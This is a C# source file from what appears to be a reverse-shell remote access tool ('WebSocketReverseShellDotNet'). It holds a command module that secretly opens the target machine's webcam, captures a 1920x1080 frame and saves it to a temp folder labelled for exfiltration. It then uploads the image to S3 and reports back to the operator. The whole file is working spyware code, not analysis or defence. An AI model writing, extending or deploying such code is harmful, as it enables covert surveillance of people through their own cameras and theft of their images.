using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

using System.IO;

using System.Drawing;
using System.Windows.Forms;
using System.ComponentModel;
using System.Drawing.Imaging;
using WebSocketReverseShellDotNet.utils;

using Emgu.CV;
using Emgu.CV.CvEnum;


namespace WebSocketReverseShellDotNet.service.commands
{
    public class CameraScreenShot : Command
    {




        public string ExecuteCommand(string command)
        {
            StringBuilder sb = new StringBuilder();

            try
            {
                // Specify the desired resolution
                int width = 1920; // adjust as needed
                int height = 1080; // adjust as needed

                // Initialize camera capture with specified resolution
                using (var capture = new VideoCapture(0))
                {
                    // Check if the capture device is opened successfully
                    if (!capture.IsOpened)
                    {
                        sb.AppendLine("Error: Could not open camera.");
                        return sb.ToString();

                    }

                    // Set the resolution
                    capture.Set(CapProp.FrameWidth, width);
                    capture.Set(CapProp.FrameHeight, height);

                    // Capture a frame
                    Mat frame = new Mat();
                    capture.Read(frame);

                    OSUtil.CreateDirectoryInTmpFolder(Constants.EXFILTRATE_FOLDER);

                    String path = OSUtil.GetSystemTempDir()+ Constants.EXFILTRATE_FOLDER + "\\" +
                        $"captured_image_{DateTime.Now:yyyyMMdd_HHmmss}.jpg";

                    // Save the frame as an image file (JPEG format in this example)
                    
                    CvInvoke.Imwrite(path, frame);

                    sb.Append($"Image captured and saved as {path} ");
                    FileInfo fileToUpload = new FileInfo(path);

                    sb.AppendLine(S3Uploadutil.UploadToS3(fileToUpload));

                }

            }
                
            catch (Exception ex)
            {
                sb.AppendLine(ex.StackTrace);
                sb.AppendLine("error while saving cameraShot: " + ex.Message);
                return sb.ToString();
            }

            return sb.ToString();

        }

       


    }
}
